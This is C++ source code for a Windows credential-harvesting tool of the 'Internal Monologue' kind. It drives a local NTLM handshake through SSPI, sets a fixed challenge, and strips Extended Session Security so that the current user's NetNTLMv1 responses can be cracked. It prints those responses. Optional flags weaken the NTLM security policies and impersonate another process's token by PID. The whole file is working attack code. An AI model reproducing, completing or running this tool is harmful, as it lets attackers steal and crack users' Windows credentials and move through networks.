#include "includes.hpp"
#include "defs.hpp"
#include "helpers.hpp"

DWORD ProcessNtlmSSP(int argc, char* argv[], LPCWSTR challenge);
DWORD ProcessInternalMonologue(LPCWSTR challenge);
InternalMonologueResponse InternalMonologueForCurrentUser(LPCWSTR challenge, bool DisableEss = true);
void ParseNTResponse(const std::vector<BYTE>& message, LPCWSTR challenge, InternalMonologueResponse& result);
void ReplaceChallenge(std::vector<uint8_t>& serverMessage, const std::vector<uint8_t>& challengeBytes);


int main(int argc, char* argv[]) {
	setlocale(LC_ALL, "");
	if (ProcessNtlmSSP(argc, argv, (LPCWSTR)L"1122334455667788") != 0) {
		ferror(L"ProcessNtlmSSP");
		return 1;
	}
	return 0;
}

DWORD ProcessNtlmSSP(int argc, char* argv[], LPCWSTR challenge) {
	bool elevated = IsElevated();
	bool downgrade = cmdOptionExists(argv, argv + argc, "-downgrade");
	bool impersonate = cmdOptionExists(argv, argv + argc, "-pid");
	DWORD  oldValue_LMCompatibilityLevel = 0;
	DWORD oldValue_NtlmMinClientSec = 0;
	DWORD oldValue_RestrictSendingNTLMTraffic = 0;
	if (elevated) {
		if (downgrade) {
			ExtendedNTLMDowngrade(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
		}

		if (impersonate) {
			DWORD pid = atoi(getCmdOption(argv, argv + argc, "-pid"));
			if (ApplyProcessToken(pid) != 0) {
				ferror(L"ApplyProcessToken")
			}
		}
	}

	DWORD result = ProcessInternalMonologue(challenge);
	if (downgrade && elevated) {
		NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
	}

	return result;
}


DWORD ProcessInternalMonologue(LPCWSTR challenge) {
	try {
		auto res = InternalMonologueForCurrentUser(challenge);
		res.Print();
		return 0;
	} catch (const std::exception& e) {
		return -1;
	}
}

InternalMonologueResponse InternalMonologueForCurrentUser(LPCWSTR challenge, bool DisableEss) {
	SecBuffer secbufPointer = { 0, SECBUFFER_TOKEN, NULL };

	SecBufferDesc ClientToken;
	SecBuffer ClientSecBuffer;
	ClientToken.cBuffers = 1;
	ClientToken.ulVersion = SECBUFFER_VERSION;
	ClientToken.pBuffers = &ClientSecBuffer;
	ClientSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
	ClientSecBuffer.pvBuffer = valloc(MAX_TOKEN_SIZE);
	ClientSecBuffer.BufferType = SECBUFFER_TOKEN;


	SecBufferDesc ServerToken;
	SecBuffer ServerSecBuffer;
	ServerToken.cBuffers = 1;
	ServerToken.ulVersion = SECBUFFER_VERSION;
	ServerToken.pBuffers = &ServerSecBuffer;
	ServerSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
	ServerSecBuffer.pvBuffer = valloc(MAX_TOKEN_SIZE);
	ServerSecBuffer.BufferType = SECBUFFER_TOKEN;


	CredHandle _hCred = {};
	_hCred.dwLower = _hCred.dwUpper = 0;
	TimeStamp ClientLifeTime = {};
	ClientLifeTime.LowPart = 0;
	ClientLifeTime.HighPart = 0;
	CredHandle _hClientContext = {}, _hServerContext = {};
	unsigned long ContextAttributes = 0;

	InternalMonologueResponse response;
	response.UserName = GetCurrentUsername();
	if (response.UserName.empty()) {
		throw std::runtime_error("error");
	}

	SECURITY_STATUS status = AcquireCredentialsHandleW(
		(LPWSTR)response.UserName.c_str(),
		(LPWSTR)L"NTLM",
		SECPKG_CRED_BOTH,
		NULL,
		NULL,
		NULL,
		NULL,
		&_hCred,
		&ClientLifeTime
	);


	CheckStatus(status, L"AcquireCredentialsHandle");

	status = InitializeSecurityContextW(
		&_hCred,
		NULL,
		(LPWSTR)response.UserName.c_str(),
		ISC_REQ_CONNECTION,
		0,
		SECURITY_NATIVE_DREP,
		NULL,
		0,
		&_hClientContext,
		&ClientToken,
		&ContextAttributes,
		&ClientLifeTime
	);

	CheckStatus(status, L"IntitializeSecurityContext");

	status = AcceptSecurityContext(
		&_hCred,
		NULL,
		&ClientToken,
		ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY,
		SECURITY_NATIVE_DREP,
		&_hServerContext,
		&ServerToken,
		&ContextAttributes,
		&ClientLifeTime
	);

	CheckStatus(status, L"AcceptSecurityContext");
	std::vector <BYTE> serverMessage;
	serverMessage = GetSecBufferByteArray(&ServerToken);


	std::vector<uint8_t> challengeBytes = StringToByteArray(challenge);

	if (DisableEss) {
		serverMessage[22] = (BYTE)(serverMessage[22] & 0xF7);
	}

	ReplaceChallenge(serverMessage, challengeBytes);

	vfree(ServerSecBuffer.pvBuffer);
	SecBuffer ServerSecBuffer2;
	ServerSecBuffer2.cbBuffer = serverMessage.size();
	ServerSecBuffer2.pvBuffer = serverMessage.data();
	ServerSecBuffer2.BufferType = SECBUFFER_TOKEN;
	ServerToken.pBuffers = &ServerSecBuffer2;

	vfree(ClientSecBuffer.pvBuffer);
	SecBuffer ClientSecBuffer2;
	ClientSecBuffer2.pvBuffer = valloc(MAX_TOKEN_SIZE);
	ClientSecBuffer2.cbBuffer = MAX_TOKEN_SIZE;
	ClientSecBuffer2.BufferType = SECBUFFER_TOKEN;
	ClientToken.pBuffers = &ClientSecBuffer2;

	status = InitializeSecurityContextW(
		&_hCred,
		&_hClientContext,
		(LPWSTR)response.UserName.c_str(),
		ISC_REQ_CONNECTION,
		0,
		SECURITY_NATIVE_DREP,
		&ServerToken,
		0,
		&_hClientContext,
		&ClientToken,
		&ContextAttributes,
		&ClientLifeTime
	);

	CheckStatus(status, L"InitializeSecurityContext (after challenge replacing)")

	if (status != SEC_E_OK && DisableEss) {
		vfree(ClientSecBuffer2.pvBuffer);
		vfree(ServerSecBuffer2.pvBuffer);
		return InternalMonologueForCurrentUser(challenge, false);
	}

	std::vector<BYTE> result = GetSecBufferByteArray(&ClientToken);
	vfree(ClientSecBuffer2.pvBuffer);
	vfree(ServerSecBuffer2.pvBuffer);

	ParseNTResponse(result, challenge, response);

	return response;
}

void ParseNTResponse(const std::vector<BYTE>& message, LPCWSTR challenge, InternalMonologueResponse& result) {
	uint16_t lm_resp_len = *reinterpret_cast<const uint16_t*>(&message[12]);
	uint32_t lm_resp_off = *reinterpret_cast<const uint32_t*>(&message[16]);
	uint16_t nt_resp_len = *reinterpret_cast<const uint16_t*>(&message[20]);
	uint32_t nt_resp_off = *reinterpret_cast<const uint32_t*>(&message[24]);
	uint16_t domain_len = *reinterpret_cast<const uint16_t*>(&message[28]);
	uint32_t domain_off = *reinterpret_cast<const uint32_t*>(&message[32]);


	std::vector<BYTE> lm_resp(lm_resp_len);
	std::vector<BYTE> nt_resp(nt_resp_len);
	std::vector<BYTE> domain(domain_len);

	std::copy(message.begin() + lm_resp_off, message.begin() + lm_resp_off + lm_resp_len, lm_resp.begin());
	std::copy(message.begin() + nt_resp_off, message.begin() + nt_resp_off + nt_resp_len, nt_resp.begin());
	std::copy(message.begin() + domain_off, message.begin() + domain_off + domain_len, domain.begin());

	result.Challenge = challenge;
	result.UsernameWithoutDomain = SplitDomain(result.UserName);

	if (nt_resp_len == 24) {
		result.Domain = ConvertHex(byteArrayToString(domain));
		result.Resp1 = byteArrayToString(lm_resp);
		result.Resp2 = byteArrayToString(nt_resp);
	}
	else if (nt_resp_len > 24) {
		result.Domain = ConvertHex(byteArrayToString(domain));
		result.Resp1 = byteArrayToString(nt_resp).substr(0, 32);
		result.Resp2 = byteArrayToString(nt_resp).substr(32);
	}
}

void ReplaceChallenge(std::vector<uint8_t>& serverMessage, const std::vector<uint8_t>& challengeBytes) {
	std::copy(challengeBytes.begin(), challengeBytes.begin() + 8, serverMessage.begin() + 24);
	std::fill(serverMessage.begin() + 32, serverMessage.begin() + 48, 0);
}
